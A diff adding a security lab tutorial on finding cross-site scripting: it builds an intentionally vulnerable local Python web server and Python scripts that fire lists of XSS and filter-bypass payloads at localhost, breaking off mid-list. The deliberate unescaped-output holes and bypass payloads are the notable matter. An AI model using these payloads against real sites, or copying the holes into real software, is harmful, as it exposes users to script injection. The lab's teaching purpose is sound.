@@ -1,0 +1,286 @@
+Discover XSS with Manual & Fuzz-Based Inputs
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the fundamentals of Cross-Site Scripting (XSS) vulnerabilities
+Manually identify and test for XSS vulnerabilities in web applications
+Use Burp Suite Community Edition for automated XSS detection
+Implement fuzzing techniques to discover XSS vulnerabilities
+Create Python scripts to automate payload generation and injection
+Analyze and interpret XSS test results
+Document findings and assess the impact of discovered vulnerabilities
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of HTML, JavaScript, and HTTP protocols
+Familiarity with Linux command line operations
+Basic knowledge of web application architecture
+Understanding of web browser developer tools
+Basic Python programming knowledge
+Familiarity with web security concepts
+Lab Environment
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or configure additional environments.
+
+Task 1: Set Up the Lab Environment and Vulnerable Web Application
+Subtask 1.1: Verify System Requirements
+First, let's verify that all necessary tools are available on your system:
+
+# Check if Python is installed
+python3 --version
+
+# Check if curl is available
+curl --version
+
+# Check if Firefox is installed
+firefox --version
+
+# Verify Burp Suite Community Edition is available
+ls /opt/BurpSuiteCommunity/
+Subtask 1.2: Install Additional Required Tools
+Install any missing dependencies:
+
+# Update package manager
+sudo apt update
+
+# Install required packages
+sudo apt install -y python3-pip python3-requests python3-beautifulsoup4 nodejs npm
+
+# Install additional Python libraries
+pip3 install requests beautifulsoup4 selenium
+Subtask 1.3: Set Up a Local Vulnerable Web Application
+Create a simple vulnerable web application for testing:
+
+# Create project directory
+mkdir ~/xss-lab
+cd ~/xss-lab
+
+# Create a vulnerable web application
+cat > vulnerable_app.py << 'EOF'
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+import html
+
+class VulnerableHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed_path = urlparse(self.path)
+        query_params = parse_qs(parsed_path.query)
+        
+        if parsed_path.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            
+            html_content = '''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>XSS Testing Lab</title>
+            </head>
+            <body>
+                <h1>XSS Vulnerability Testing Lab</h1>
+                
+                <!-- Reflected XSS Vulnerable Form -->
+                <h2>Search Function (Reflected XSS)</h2>
+                <form method="GET" action="/search">
+                    <input type="text" name="q" placeholder="Enter search term">
+                    <input type="submit" value="Search">
+                </form>
+                
+                <!-- Comment Form (Stored XSS) -->
+                <h2>Comment Section (Stored XSS)</h2>
+                <form method="GET" action="/comment">
+                    <input type="text" name="name" placeholder="Your name">
+                    <textarea name="comment" placeholder="Your comment"></textarea>
+                    <input type="submit" value="Post Comment">
+                </form>
+                
+                <!-- DOM-based XSS -->
+                <h2>Welcome Message (DOM XSS)</h2>
+                <script>
+                    var urlParams = new URLSearchParams(window.location.search);
+                    var name = urlParams.get('name');
+                    if (name) {
+                        document.write('<p>Welcome ' + name + '!</p>');
+                    }
+                </script>
+            </body>
+            </html>
+            '''
+            self.wfile.write(html_content.encode())
+            
+        elif parsed_path.path == '/search':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            
+            search_term = query_params.get('q', [''])[0]
+            
+            # Vulnerable: Direct output without sanitization
+            html_content = f'''
+            <!DOCTYPE html>
+            <html>
+            <head><title>Search Results</title></head>
+            <body>
+                <h1>Search Results</h1>
+                <p>You searched for: {search_term}</p>
+                <a href="/">Back to Home</a>
+            </body>
+            </html>
+            '''
+            self.wfile.write(html_content.encode())
+            
+        elif parsed_path.path == '/comment':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            
+            name = query_params.get('name', [''])[0]
+            comment = query_params.get('comment', [''])[0]
+            
+            # Vulnerable: Direct output without sanitization
+            html_content = f'''
+            <!DOCTYPE html>
+            <html>
+            <head><title>Comment Posted</title></head>
+            <body>
+                <h1>Comment Posted</h1>
+                <p><strong>{name}</strong> said:</p>
+                <p>{comment}</p>
+                <a href="/">Back to Home</a>
+            </body>
+            </html>
+            '''
+            self.wfile.write(html_content.encode())
+
+if __name__ == '__main__':
+    server = HTTPServer(('localhost', 8080), VulnerableHandler)
+    print("Vulnerable web server running on http://localhost:8080")
+    server.serve_forever()
+EOF
+
+# Make the script executable
+chmod +x vulnerable_app.py
+Subtask 1.4: Start the Vulnerable Application
+# Start the vulnerable web application in the background
+python3 vulnerable_app.py &
+
+# Note the process ID for later termination
+echo $! > webapp_pid.txt
+
+# Verify the application is running
+curl -s http://localhost:8080 | head -10
+Task 2: Manual XSS Testing Techniques
+Subtask 2.1: Identify Input Points
+Open Firefox and navigate to the vulnerable application:
+
+# Open Firefox and navigate to the application
+firefox http://localhost:8080 &
+Manual Steps in Firefox:
+
+Navigate to http://localhost:8080
+Identify all input fields on the page
+Note the different types of forms available:
+Search form (GET parameter)
+Comment form (GET parameters)
+URL parameters for DOM-based XSS
+Subtask 2.2: Basic XSS Payload Testing
+Create a script to test basic XSS payloads:
+
+# Create basic XSS testing script
+cat > manual_xss_test.py << 'EOF'
+#!/usr/bin/env python3
+import requests
+import urllib.parse
+
+# Basic XSS payloads
+basic_payloads = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<iframe src=javascript:alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<select onfocus=alert('XSS') autofocus>",
+    "<textarea onfocus=alert('XSS') autofocus>",
+    "<keygen onfocus=alert('XSS') autofocus>"
+]
+
+def test_reflected_xss(base_url, payloads):
+    print("Testing Reflected XSS...")
+    print("-" * 50)
+    
+    for i, payload in enumerate(payloads, 1):
+        encoded_payload = urllib.parse.quote(payload)
+        test_url = f"{base_url}/search?q={encoded_payload}"
+        
+        try:
+            response = requests.get(test_url)
+            if payload in response.text:
+                print(f"[VULNERABLE] Payload {i}: {payload}")
+                print(f"URL: {test_url}")
+                print(f"Response contains unescaped payload")
+                print()
+            else:
+                print(f"[SAFE] Payload {i}: Payload was filtered or escaped")
+        except Exception as e:
+            print(f"[ERROR] Testing payload {i}: {e}")
+
+def test_stored_xss(base_url, payloads):
+    print("Testing Stored XSS...")
+    print("-" * 50)
+    
+    for i, payload in enumerate(payloads, 1):
+        encoded_payload = urllib.parse.quote(payload)
+        test_url = f"{base_url}/comment?name=TestUser&comment={encoded_payload}"
+        
+        try:
+            response = requests.get(test_url)
+            if payload in response.text:
+                print(f"[VULNERABLE] Payload {i}: {payload}")
+                print(f"URL: {test_url}")
+                print(f"Response contains unescaped payload")
+                print()
+            else:
+                print(f"[SAFE] Payload {i}: Payload was filtered or escaped")
+        except Exception as e:
+            print(f"[ERROR] Testing payload {i}: {e}")
+
+if __name__ == "__main__":
+    base_url = "http://localhost:8080"
+    
+    print("Manual XSS Testing Script")
+    print("=" * 50)
+    
+    test_reflected_xss(base_url, basic_payloads)
+    print()
+    test_stored_xss(base_url, basic_payloads)
+EOF
+
+# Make the script executable and run it
+chmod +x manual_xss_test.py
+python3 manual_xss_test.py
+Subtask 2.3: Advanced Manual Testing Techniques
+Create an advanced testing script with filter bypass techniques:
+
+# Create advanced XSS testing script
+cat > advanced_xss_test.py << 'EOF'
+#!/usr/bin/env python3
+import requests
+import urllib.parse
+import time
+
+# Advanced XSS payloads for filter bypass
+advanced_payloads = [
+    # Case variation
+    "<ScRiPt>alert('XSS')</ScRiPt>",
+    "<SCRIPT>alert('XSS')</SCRIPT>",
+    
+    # Encoding variations
+    "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+    
+    # Event handlers
+    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+    "<svg/on…
